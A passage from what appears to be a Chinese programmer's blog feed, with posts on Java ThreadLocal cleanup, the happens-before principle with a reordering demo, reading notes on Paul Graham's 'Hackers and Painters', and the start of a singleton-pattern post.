class="comment">//会清理直到下个Entry节点为止中间的所有&lt;null，value&gt;，至于为什么只清理这一区间而不清理所有，这是很巧妙的算法，因为</span></span><br><span class="line">    <span class="comment">//threadlocalMap使用的是避免哈希碰撞的算法是线性探测</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">cleanSomeSlots</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> removed = <span class="keyword">false</span>;</span><br><span class="line">        Entry[] tab = table;</span><br><span class="line">        <span class="keyword">int</span> len = tab.length;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            i = nextIndex(i, len);</span><br><span class="line">            Entry e = tab[i];</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="keyword">null</span> &amp;&amp; e.get() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                n = len;</span><br><span class="line">                removed = <span class="keyword">true</span>;</span><br><span class="line">                i = expungeStaleEntry(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> ( (n &gt;&gt;&gt;= <span class="number">1</span>) != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> removed;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但通过set，get等方法内部的清理方式有延时，所以最好还是使用remove()方法及时清理。</p><p>进一步的，对于线程池而言，线程长期存活，线程一直强引用Entry造成内存泄漏，所以要及时调用remove()方法清理。</p>]]></content>
    
    
    <summary type="html">threadlocal原理探究</summary>
    
    
    
    <category term="Java" scheme="http://lishuaiyun.cn/categories/Java/"/>
    
    
    <category term="Java源码" scheme="http://lishuaiyun.cn/tags/Java%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>happens-before</title>
    <link href="http://lishuaiyun.cn/2022/02/12/happens-before/"/>
    <id>http://lishuaiyun.cn/2022/02/12/happens-before/</id>
    <published>2022-02-12T12:39:49.000Z</published>
    <updated>2022-03-26T13:14:21.535Z</updated>
    
    <content type="html"><![CDATA[<p>happens-before原则这里一直云里雾里，今天总结了一下。</p><h2 id="1-从单线程的as-if-serial语义和指令重排序说起。"><a href="#1-从单线程的as-if-serial语义和指令重排序说起。" class="headerlink" title="1. 从单线程的as-if-serial语义和指令重排序说起。"></a>1. 从单线程的as-if-serial语义和指令重排序说起。</h2><p><strong>指令重排</strong></p><p>指令重排就是减少中断的一种技术。但是如果重排序具有数据依赖的操作执行顺序，程序的执行结果就会改变。</p><p>编译器和处理器在重排序时，会遵守数据依赖性，编译器和处理器不会改变存在数据依赖关系的两个操作的执行顺序。这里所说的数据依赖性仅针对单个处理器中执行的指令序列和单个线程中执行的操作，<strong>不同处理器之间和不同线程之间的数据依赖性不被编译器和处理器考虑</strong>。</p><p><strong>as-if-serial语义</strong></p><p>as-if-serial语义的意思是：不管怎么重排序（编译器和处理器为了提高并行度），（单线程）程序的执行结果不能被改变。编译器、runtime和处理器都必须遵守as-if-serial语义。</p><p>为了遵守as-if-serial语义，编译器和处理器不会对存在数据依赖关系的操作做重排序，因为这种重排序会改变执行结果。但是，如果操作之间不存在数据依赖关系，这些操作就可能被编译器和处理器重排序。</p><p>编译器和处理器为了遵守as-if-serial语义可以保证串行语义一致，但是没有义务保证多线程间的语义也一致。<strong>所以在多线程下，指令重排序可能会导致一些问题。</strong></p><h2 id="2-happens-before"><a href="#2-happens-before" class="headerlink" title="2. happens-before"></a>2. happens-before</h2><p>首先看下示例说明多线程下指令重排序的隐患：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HappensBefore</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 线程1和线程2执行，没有执行加锁等同步策略</span></span><br><span class="line"><span class="comment">    * 分别执行的话不考虑重排序如果线程2的条件语句得到执行，那么res的值一定是9</span></span><br><span class="line"><span class="comment">    * 但是如果线程1进行了指令重排序,线程2在线程1的flag=true执行后num执行前会得到res = 1的结果</span></span><br><span class="line"><span class="comment">    * 所以对于多个线程操作同一变量，同时具有可见性和重排序的问题，重排序就是happens-before需要解决的问题</span></span><br><span class="line"><span class="comment">    * 多个线程会发生虽然在单个线程内没有数据依赖，但多个线程通过共享变量存在数据依赖导致单线程不能随便进行指令重排序的情况。</span></span><br><span class="line"><span class="comment">    * 单线程重排序as-if-serial解决，多线程重排序happens-before解决</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMethod</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="comment">//两个语句没有数据依赖，可以重排序</span></span><br><span class="line">            num = <span class="number">3</span>;</span><br><span class="line">            flag = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">        Thread thread2 = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">                res = num * num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread1.start();</span><br><span class="line">        thread2.start();</span><br><span class="line">        Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        HappensBefore demo = <span class="keyword">new</span> HappensBefore();</span><br><span class="line">        demo.testMethod();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>happens-before关系本质上和as-if-serial语义是一回事。多个线程会发生虽然在单个线程内没有数据依赖，但多个线程通过共享变量存在数据依赖会导致单线程不能随便进行指令重排序的情况。</p><p>as-if-serial语义保证单线程内重排序后的执行结果和程序代码本身应有的结果是一致的，<strong>happens-before关系保证正确同步的多线程程序的执行结果不被重排序改变。</strong></p><p>总之，如果操作A happens-before操作B（happens-before不是简单的A发生在B之前，而是B想要看到A的操作，那么需要操作之间必须存在happens-before关系），那么操作A在内存上所做的操作对操作B都是可见的，不管它们在不在一个线程。</p><p>在Java中，有以下天然的happens-before关系：</p><ul><li>程序顺序规则：一个线程中的每一个操作，happens-before于该线程中的任意后续操作。</li><li><p>监视器锁规则：对一个锁的解锁，happens-before于随后对这个锁的加锁。</p></li><li><p>volatile变量规则：对一个volatile域的写，happens-before于任意后续对这个volatile域的读。</p></li><li><p>传递性：如果A happens-before B，且B happens-before C，那么A happens-before C。</p></li><li><p>start规则：如果线程A执行操作ThreadB.start()启动线程B，那么A线程的ThreadB.start（）操作happens-before于线程B中的任意操作、</p></li><li>join规则：如果线程A执行操作ThreadB.join（）并成功返回，那么线程B中的任意操作happens-before于线程A从ThreadB.join()操作成功返回。</li></ul><p>最后，附上在学校内论坛发帖引起的讨论：</p><p><a href="https://bbs.byr.cn/#!article/Java/66185">北邮人论坛：多线程编程中顺序一致性模型和happens-before怎么理解</a></p>]]></content>
    
    
    <summary type="html">happens-before浅析</summary>
    
    
    
    <category term="Java" scheme="http://lishuaiyun.cn/categories/Java/"/>
    
    
    <category term="多线程" scheme="http://lishuaiyun.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>黑客与画家</title>
    <link href="http://lishuaiyun.cn/2022/01/11/%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6/"/>
    <id>http://lishuaiyun.cn/2022/01/11/%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6/</id>
    <published>2022-01-11T09:23:35.000Z</published>
    <updated>2022-04-11T13:07:40.640Z</updated>
    
    <content type="html"><![CDATA[<p>黑客与画家是硅谷创业之父Paul Graham在互联网从业多年的思考，包含他对于创业、致富、沟通、设计、工作、编程和思考方式的理解，这本书真的太好了，关于思考的方式，关于程序的理解，关于团队的沟通都与平时自己积累下来的想法不谋而合。</p><h1 id="1-从业思考"><a href="#1-从业思考" class="headerlink" title="1. 从业思考"></a>1. 从业思考</h1><p>原文：计算机科学是数学和计算机博物学家（研究专门性题目，比如路由算法），计算机技术是黑客（软件工程），是工程师，黑客搞懂“计算理论”的必要性，与画家搞懂颜料化学成分的必要性差不多大。</p><p>理解：理科和工科工作思想有本质区别，理学通常是基础研究，注重理论推导。而工学更强调实用价值，定理应该怎么用是工学更看重的。这也是我从数学转到计算机最难以适应的地方，下意识的探究原理让我比别的同学进度更慢更累，当然，基础会更扎实。</p><p>原文：你把整个程序想清楚的时间点，应该是在编写代码的同时，而不是在编写代码之前，编程语言是用来帮助思考程序的，而不是用来表达你已经想好的程序。<strong>它应该是一支铅笔，而不是一支钢笔</strong>。</p><p>理解：一开始就把所有的细节想好不太现实，也很影响效率，先把大体思路用程序表达出来再不断丰富是更好的选择。</p><p>原文：不要长年累月地在一个项目上不断工作，<strong>应该定期地从头开始，而并且试图把所有的最新想法都以修订版的形式包括进去。</strong></p><p>理解：定期的重写迭代，就像看书，每次读都会有新的收获。</p><p>原文：多人共同开发一个软件的正确模式是需要合作，但是不要“合”得过头。如果一个代码块由三四个人共同开发，就没有人真正“拥有”这块代码。正确的合作方法是将项目分割成严格定义的模块，每一个模块由一个人明确负责。模块与模块之间的接口经过精心设计，如果可能的话，最好把文档说明写得像编程语言规范那样清晰。</p><p>理解：工作分配方式</p><p>原文：<strong>你必须能够站在用户的角度思考问题，也就是说你必须学会“换位思考”。</strong>判断一个人是否具备“换位思考”的能力有一个好方法，那就是看他怎样向没有技术背景的人解释技术问题。 软件的部分功能就是解释自身。为了写出优秀软件，你必须假定用户对你的软件基本上一无所知。 在某些地方，自行其道、完全不替读者着想，被看成是高水平、高智商的表现，甚至都发展成了一种风尚。但是，我不觉得“换位思考”与智商之间存在任何联系。</p><p>理解：写注释的重要性</p><p>原文：黑客就像画家，工作起来是有心理周期的。有时候，你有了一个令人兴奋的新项目，你会愿意为它一天工作16个小时。等过了这一阵，你又会觉得百无聊赖，对所有事情都提不起兴趣。<strong>在你厌倦的时候再去做那些比较容易的工作，这是个不错的主意。</strong></p><p>理解：就像我现在写博客~</p><h1 id="2-设计"><a href="#2-设计" class="headerlink" title="2. 设计"></a>2. 设计</h1><p>原文：<strong>大公司为了避免设计上的灾难，选择了减少设计结果的标准差。</strong>但是当你排斥差异的时候，你不仅将失败的可能性排除在外，也将获得高利润的可能性排除在外。这对大公司来说不是问题，因为生产特别优秀的产品不是它们的获胜手段。大公司只要做到不太烂，就能赢。</p><p>理解：资本的胜利。</p><p>原文：<strong>真正竞争软件设计的战场是新兴领域的市场，这里还没有人建立过防御工事。</strong>只要你能做出大胆的设计，由一个人或一批人同时负责设计和实现产品，你就能在这里战胜大公司。微软公司自己一开始就是这样走向成功的，苹果公司和惠普公司也是如此。我觉得几乎所有的创业公司都是这样取得成功的。</p><p>理解：抖音就是这样成功的，布局新兴领域，这也是当今领域都被大型互联网公司垄断情况下创业公司成功的唯一途径。</p><p>原文：好设计是简单的设计。当你被迫把东西做得很简单时，你就被迫直接面对真正的问题。当你不能用表面的装饰交差时，你就不得不做好真正的本质部分。</p><p>理解：其实人们更喜欢简洁的设计模式，前提是去掉一切装饰后的本质真的很美。</p><p>原文：好设计是永不过时的设计。</p><p>理解：优雅永不过时。</p><p>原文：好设计常常是大胆的设计</p><h1 id="3-思考：不能说的话"><a href="#3-思考：不能说的话" class="headerlink" title="3. 思考：不能说的话"></a>3. 思考：不能说的话</h1><p>原文：要是能坐上时间机器回到过去，不管哪一个年代，有一件事都是不会改变的，那就是“祸从口出”。你一定要小心自己说的话。</p><p>理解：祸从口出</p><p>原文：不要随大流，凡是不认同社会之处，你连想都不敢想，马上就放弃自己的观点，那才会真正出问题。</p><p>理解：群体的意见一致，但智商底下。我们是群体的一份子，但要学会从群体中抽离出来称为能独立思考的个体，见&lt;&lt;乌合之众&gt;&gt;。</p><h2 id="3-1-什么是不能说的话"><a href="#3-1-什么是不能说的话" class="headerlink" title="3.1 什么是不能说的话"></a>3.1 什么是不能说的话</h2><p>原文：判断言论真伪。未来的人们很可能会发现，他们觉得很平常的话，在我们今天这个时代都是不能说的。现在有没有伽利略这样的人和事？很可能是有的。</p><p>理解：</p><p>原文：找出标签，然后列出相关想法，逐个追问。研究人员记录了医生检查X光片时的眼球运动。研究发现，即使那些医生漏掉了一个癌症病灶，他们的目光通常也会在那个地方停留一会。这说明他们的头脑深处已经意识到那里有问题，但是这种深层的反应没有上升为自觉的意识。</p><p>理解：经常性的会感觉到可能存在某些问题，但常常因为思考的懒惰不去想，这些我们隐隐觉得有问题的通常就有问题。</p><p>原文：回顾过去。请问过去的看法与现在的看法哪一个更正确？很多时候你无法回答，<strong>因为过去与现在之间的变化往往不是因为对错，而是因为社会观念变了。如果某个观点在大部分时空都是不受禁止的，只有我们这个社会才把它当作禁忌，那么很可能是我们出错了。</strong></p><p>理解：</p><p>原文：<strong>寻找那些一本正经的卫道者，看看他们到底在捍卫着什么，不想让你看见什么。</strong>孩子“被迫”在一个精心设计的环境中长大。他的头脑或多或少是纯洁无瑕的，一点也不知道那些“不能说的话”，从来没有被真实的社会生活“污染”过。孩子眼里的世界是不真实的，是一个被灌输进他们头脑的假想世界。将来当孩子长大以后接触社会，就会发现小时候以为真实的事情，在现实世界中是荒唐可笑的。</p><p>理解：小时候父母说什么就是什么，我们觉得什么都是正确的，现在我们知道父母的很多观点都是错的甚至是荒谬的。主流舆论控制下我们生活在信息茧房内，谁能保证自己看到了真实的世界，只有通过自己的思考能更贴近一些。</p><p>原文：<strong>去观察禁忌是如何产生的。</strong>不管实际上是否有思想斗争，斗争总是会以思想斗争的形式表现出来，思想斗争更容易争取支持者。第一批的接受者总是带有很强的抱负心，他们有自觉的精英意识，想把自己与普通人区分开来。当流行趋势确立以后，第二批接受者就加入进来了，人数比上一批庞大得多，恐惧心在背后驱使着他们。他们接受流行，不是因为想要与众不同，而是因为害怕与众不同。</p><p>理解：融入群体的个体智商低下，通常会很容易接受自己作为个体不能接受的行为或思想。见乌合之众。</p><h2 id="3-2-为什么找出不能说的话"><a href="#3-2-为什么找出不能说的话" class="headerlink" title="3.2 为什么找出不能说的话"></a>3.2 为什么找出不能说的话</h2><p>原文：纯粹的好奇心，对任何被禁止的东西都有特别强烈的好奇心。<strong>我要亲眼看一下，然后自己做决定。</strong></p><p>理解：我要有自己的思想，而不是被动灌输的思想。</p><p>原文：这是很好的脑力训练，尤其是那些似乎不应该思考的问题，你的大脑也要养成思考它们的习惯。<strong>训练自己去想那些不能想的事情，你获得的好处会超过所得到的想法本身。</strong>如果你能“远远地”跳出传统思维，提出让别人一听就脑袋轰一声炸开的惊人观点，那么你就在“小小地”跳出传统思维方面不会有任何困难。要知道，人们把后面的这种情况称为“创新”。</p><p>理解：不知道从什么时候起懒的思考，长久下来思维变得迟钝，养成思考的习惯，即便是错的。</p><p>原文：优秀作品往往来自于其他人忽视的想法，而最被忽视的想法就是那些被禁止的思想观点。做一个异端是有回报的，不仅是在科学领域，在任何有竞争的地方，只要你能看到别人看不到或不敢看的东西，你就有很大的优势。</p><p>理解：勇敢思考，敢为别人不敢为。</p><h2 id="3-3-发现了“不能说的话”但别说"><a href="#3-3-发现了“不能说的话”但别说" class="headerlink" title="3.3 发现了“不能说的话”但别说"></a>3.3 发现了“不能说的话”但别说</h2><p>至少也要挑选合适的场合再说，只打那些值得打的仗。</p><p>原文：这时你要明白，<strong>自由思考比畅所欲言更重要。好的方法是在思想和言论之间划一条明确的界线。在心里无所不想，但是不一定要说出来。鼓励自己在心里默默思考那些最无法无天的想法。</strong></p><p>理解：自由思考比畅所欲言更重要！</p><p>原文：“守口如瓶”的真正缺点在于，你从此无法享受讨论带来的好处了。<strong>你最好找一些信得过的知己，只与他们畅所欲言、无所不谈。这样不仅可以获得新观点，还可以用来选择朋友。能够一起谈论“异端邪说”并且不会因此气急败坏的人，就是你最应该认识的朋友。</strong></p><p>理解：切忌交浅言深，有这样的朋友是幸事。</p><h2 id="3-4-如果一定要做出回答"><a href="#3-4-如果一定要做出回答" class="headerlink" title="3.4 如果一定要做出回答"></a>3.4 如果一定要做出回答</h2><p>原文：<strong>我还没想好。人们喜欢讨论的许多问题实际上都是很复杂的，马上说出你的想法对你并没有什么好处。</strong></p><p>理解：冲动是魔鬼。</p><p>原文：逐步把辩论提升到一个抽象的层次。你不要直接攻击某个标签，而要攻击它的“元标签”（meta-label）。所谓“元标签”，就是对某个标签的抽象描述。如果人们开始讨论元标签，那么原来的标签反而不会受到注意了。</p><p>原文：另一种反击的方法就是使用隐喻<br>理解：讽刺现实</p><p>最好的一种可能就是幽默。</p><h2 id="3-5-永远质疑"><a href="#3-5-永远质疑" class="headerlink" title="3.5 永远质疑"></a>3.5 永远质疑</h2><p>如果你想要清晰地思考，就必须远离人群。但是走得越远，你的处境就会越困难，受到的阻力也会越大，因为你没有迎合社会习俗，而是一步步地与它背道而驰。</p><p>原文：远离人群。你不要让自己成为人群的一分子，而要尽可能地远离人群，观察正在发生的事情，特别注意那些被压制的思想观点。</p><p>理解：群体的观点总是一致，群体观点的内容和他们接收的暗示有关。想要摆脱群体间思想的传染，最好的方式是远离群体独立思考。</p><p>原文：远离自己。客观的观察自己，通过类似的机制，一个人完全可以识别和抵制外界流行的道德观念，把它们与内心世界相分离。</p><p>理解：将自己的思想暂时从这个身体中抽离出来，能从客观的角度观察事物。</p><h1 id="4-良好的坏习惯"><a href="#4-良好的坏习惯" class="headerlink" title="4. 良好的坏习惯"></a>4. 良好的坏习惯</h1><p><strong>对于适当的不服从管教，保持宽容不会有太大的坏处</strong>，反而很有利于美国的国家优势，它使得美国不仅能吸引聪明人，还能吸引那些很自负的人。</p><p>一个人们拥有言论自由和行动自由的社会，往往最有可能采纳最优方案，而不是采纳最有权势的人提出的方案。</p><h1 id="5-创造财富"><a href="#5-创造财富" class="headerlink" title="5. 创造财富"></a>5. 创造财富</h1><ul><li>如果想致富，最好的办法就是自己创业，或者加入创业公司。</li><li><strong>创业公司将你所有的压力压缩到三四年。承受较大的压力通常会为你带来额外的报酬，但是你还是无法逃避基本的守恒定律。如果创业那么轻松，那么所有人就都去创业了。</strong></li><li><p>任何公司的成功历程中，运气都是一个很大的随机因素。</p></li><li><p>财富与金钱并不是同义词。金钱是交换财富的媒介，模糊了交易的实质。</p></li><li><p>许多人从小就认定世界上的财富总额是固定不变的。然而<strong>财富并不是零和博弈</strong>。通过修理一辆老爷车，你使得自己更富有。与此同时，你也并没有使得任何人更贫穷。所以，这里明显不是一个面积不变的大饼。事实上，当这样观察的时候，你会很好奇，为什么有人会觉得大饼的面积无法增大</p></li><li><p>大公司会使得每个员工的贡献平均化，大公司无法准确测量每个员工的贡献。要致富，你需要两样东西：可测量性和可放大性。任何一个通过自身努力而致富的个人，在他们身上应该都能同时发现可测量性和可放大性。</p><ul><li><p>是否存在可放大性，那就是看失败的可能性。因为收入和风险是对称的，所以如果有巨大的获利可能，就必然存在巨大的失败可能。</p></li><li><p><strong>小团体=可测量性</strong><br>对精英团体来说，将自己的工作与其他高手的工作平均化要比与平庸之辈的工作平均化让人满意多了。<br>乔布斯曾经说过，创业的成败取决于最早加入公司的那十个人。（尽可能加入核心团队）<br>但是，一个非常能干而且在乎回报的人，通常在同类人组成的小团队中会有更出色的表现，自己也会感到更满意。</p></li><li><p><strong>高科技=可放大性</strong><br>因为创业公司通过发明新技术盈利，所以具备可放大性。<br><strong>创业公司本质其中之一就是其他人复制你的模式是否很困难。也就是说，你为竞争对手设置的壁垒有多高。</strong><br><strong>一开始就选择较难的问题，此后的各种决策都选择较难的那个选项。（比如算法和开发，应该选算法。基架还是业务，应该选基架。为自己搭建技术壁垒，能保证核心竞争力）</strong>（总的来说这也是很好的处事原则。如果你有两个选择，就选较难的那个。如果你要选择是坐在家里看电视,还是外出跑步，那就出去跑步吧。这个方法有效的原因可能是遇到两个一难一易的选择时，往往出于懒惰的缘故，你会选择较易的那个选项。在意识深处，你其实知道不懒惰的做法会带来更好的结果,这个方法只是迫使你接受这一点）</p></li></ul></li><li><p>只有在快速获得巨大利益的激励下，你才会去挑战那些困难的问题，否则你根本不愿意去碰它们。</p></li><li><p>潜在的买家会尽可能地拖延收购。收购这件事最难的地方就是让买方真正拿出钱。大多数时候，<strong>促成买方掏钱的最好办法不是让买家看到有获利的可能，而是让他们感到失去机会的恐惧。</strong>他们真正在意的只是你拥有的用户数量。</p></li><li><p>创业公司如同蚊子，往往只有两种结局，要么赢得一切，要么彻底消失。<strong>大公司宁愿花大钱做更安全的选择，所以向他们出售一家已经成功的创业公司要比出售还处在早期阶段的创业公司更容易，即使会让他们付出多得多的价码</strong>。</p></li></ul><h1 id="6-互联网模式"><a href="#6-互联网模式" class="headerlink" title="6. 互联网模式"></a>6. 互联网模式</h1><ul><li><p>互联网软件修改起来很方便。<strong>软件的发布过程可以分解为一系列的渐进式修改</strong>，而不是猛地推出一个大幅变动的版本。</p></li><li><p>互联网软件的发布规则是：它运行不了，你就无法发布；一旦它能运行了，你就可以立刻发布。你的软件是连续性渐变的，某些更新也许比较重大，但是“版本”这个概念不适用于互联网软件。</p></li><li><p>解决新代码的bug要比解决历史遗留代码的bug容易。在自己刚刚写好的代码中，找出bug往往会比较快。</p></li><li><p>能够即时发布软件，对开发者是一个巨大的激励。如果软件的新版本要等到一年后才能发布，我就会把大部分新构思束之高阁，至少过上一段时间再来考虑<strong>。互联网软件只要想到好的构思，可以立刻着手实现。</strong></p></li><li><p><strong>向一个项目增加人手，往往会拖慢项目进程。</strong>随着参与人数的增加，人与人之间需要的沟通呈现指数式增长。人数越来越多，开会讨论各个部分如何协同工作所需的时间越来越长，无法预见的互相影响越多越大，产生的bug也越来越多。<br>理解：所以互联网公司经常加班工资高而不是降低工资释放员工时间招收更多人是有道理的，因为单纯的人力并不会使项目开发进度加快，人数的增加也意味着沟通成本的增加</p></li><li><p>效率对互联网软件至关重要，因为硬件费用由你支付。推广Viaweb的关键，就是允许访问者在线试用.(可以借此研究用户行为得到反馈)</p></li><li><p>“订报纸模式”正是互联网软件天然的收费模式。互联网软件和传统桌面软件盈利不同之处在于，互联网软件本身不需要被用来安装所以使用会员制收费，但传统桌面程序需要安装可以使用安装激活的策略</p></li><li><p>非IT公司的内部系统管理员没有行业竞争压力，日久天长就会变得工作效率低下、不负责任。不能直接感受到竞争压力的部门都应该外包出去。</p></li><li><p>互联网软件永远没有收工的那一天，如果你愿意，可以一直干下去，每天忙上16个小时。</p></li><li><p>尝试创业</p><ul><li><p>两件令人害怕的事情</p><p>实际上，这两件事都是没有通电的电篱笆。</p><ul><li><p>不懂得管理企业</p><ul><li><p>做出用户喜欢的产品<br>至于如何做出用户喜欢的产品，下面是一些通用规则。从制造简洁的产品开始着手，首先要保证你自己愿意使用。然后，迅速地做出1.0版，并且不断加以改进，整个过程中密切倾听用户的反馈。用户总是对的，但是不同的用户要求不一样。低端的用户要求简化操作和清晰易懂，高端的用户要求你增加新功能。软件最大的好处就是让一切变得简单。但是，做到这一点的方法是正确设置默认值，而不是限制用户的选择。如果竞争对手的产品很糟糕，你也不要自鸣得意。比较软件的标准应该是看对手的软件将来会有什么功能，而不是现在有什么功能。无论何时，你都要使用自己的软件。Viaweb的主要功能是建立网上商店，但是我们也使用它建立自己的网站。不要只因为对方的头衔是市场专家、设计师或产品经理，就盲目听从他们的话。如果他们的观点真的很好，那就听从他们，关键是你要自己判断，不要盲从。只有自己懂得设计的黑客，才能设计软件，不能交给对软件一知半解的设计师。如果你不打算自己动手设计和开发，那就不要创业。</p></li><li><p>保证开支小于收入。</p></li></ul></li><li><p>害怕竞争<br>可是实际上，他们害怕你胜过你害怕他们，而且这一点上，他们并没有错。几个黑客搞懂如何租用办公室，或者如何雇用销售人员，要比那些公司（不管大公司还是小公司）搞懂如何正确写出软件容易得多</p></li></ul></li></ul></li></ul>]]></content>
    
    
    <summary type="html">适合所有程序员和互联网创业者，也适合一切对计算机行业感兴趣的读者。</summary>
    
    
    
    <category term="读书分享" scheme="http://lishuaiyun.cn/categories/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="计算机随想" scheme="http://lishuaiyun.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>单例模式</title>
    <link href="http://lishuaiyun.cn/2021/09/28/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    <id>http://lishuaiyun.cn/2021/09/28/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</id>
    <published>2021-09-28T07:05:27.000Z</published>
    <updated>2022-03-26T13:14:51.391Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-目的"><a href="#1-目的" class="headerlink" title="1. 目的"></a>1. 目的</h2><p><strong>单例模式</strong>是一种创建型设计模式， 让你能够保证一个类只有一个实例， 并提供一个访问该实例的全局节点。</p><h2 id="2-问题"><a href="#2-问题" class="headerlink" title="2. 问题"></a>2. 问题</h2><p>单例模式同时解决了两个问题， 所以违反了单一职责原则：</p><ol><li><strong>保证一个类只有一个实例</strong>。 为什么会有人想要控制一个类所拥有的实例数量？ 最常见的原因是控制某些共享资源 （例如数据库或文件） 的访问权限。</li></ol><p>它的运作方式是这样的： 如果你创建了一个对象， 同时过一会儿后你决定再创建一个新对象， 此时你会获得之前已创建的对象， 而不是一个新对象。</p><p>注意， 普通构造函数无法实现上述行为， 因为构造函数的设计决定了它<strong>必须</strong>总是返回一个新对象。</p><p><img src="E:\有道云笔记存储\qq7FB9F72DBAEA505AA864E222F1AC8714(1" alt="img">\41ebffe12b584bf3b2a46a22f697ea80\n-comic-1-zh.png)</p><p>客户端甚至可能没有意识到它们一直都在使用同一个对象。</p><ol><li><p><strong>为该实例提供一个全局访问节点</strong>。 </p></li><li><ol><li>还记得你 （好吧， 其实是我自己） 用过的那些存储重要对象的全局变量吗？ 它们在使用上十分方便， 但同时也非常不安全， 因为任何代码都有可能覆盖掉那些变量的内容， 从而引发程序崩溃。</li><li>和全局变量一样， 单例模式也允许在程序的任何地方访问特定对象。 但是它可以保护该实例不被其他代码覆盖。</li><li>还有一点： 你不会希望解决同一个问题的代码分散在程序各处的。 因此更好的方式是将其放在同一个类中， 特别是当其他代码已经依赖这个类时更应该如此。</li></ol></li></ol><p>如今， 单例模式已经变得非常流行， 以至于人们会将只解决上文描述中任意一个问题的东西称为单例。</p><h2 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h2><p>所有单例的实现都包含以下两个相同的步骤：</p><ul><li>将默认构造函数设为私有， 防止其他对象使用单例类的 new运算符。</li><li>新建一个静态构建方法作为构造函数。 该函数会 “偷偷” 调用私有构造函数来创建对象， 并将其保存在一个静态成员变量中。 此后所有对于该函数的调用都将返回这一缓存对象。</li></ul><p>如果你的代码能够访问单例类， 那它就能调用单例类的静态方法。 无论何时调用该方法， 它总是会返回相同的对象。</p><p><img src="E:\有道云笔记存储\qq7FB9F72DBAEA505AA864E222F1AC8714(1" alt="img">\0ad778ab5822464fbd1a197c926b25cc\clipboard.png)</p><h2 id="4-代码"><a href="#4-代码" class="headerlink" title="4. 代码"></a>4. 代码</h2><p>单例的实现方法有很多，最常用的实现是双重校验和静态内部类。</p><p>双重校验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;   <span class="comment">//volatile保证线程间的可见性</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span 